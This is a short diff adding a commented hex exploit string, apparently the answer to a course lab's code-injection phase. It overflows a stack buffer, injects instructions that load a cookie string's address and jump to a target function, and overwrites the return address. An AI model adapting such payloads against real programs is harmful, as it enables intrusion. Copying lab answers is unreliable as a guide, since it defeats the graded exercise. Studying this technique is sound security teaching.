@@ -1,0 +1,12 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+48 c7 c7 b0 dc 61 55    /* movq $0x5561dcb0,%rdi (address of the cookie's string) */
+68 fa 18 40 00          /* push $0x4018fa (the address of touch3 be pointed by %rsp) */
+c3                      /* ret */
+00 00 00
+90 dc 61 55 00 00 00 00 /* the address of movq */
+00 00 00 00 00 00 00 00 
+35 39 62 39 39 37 66 61 /* the cookie's string */
+
+
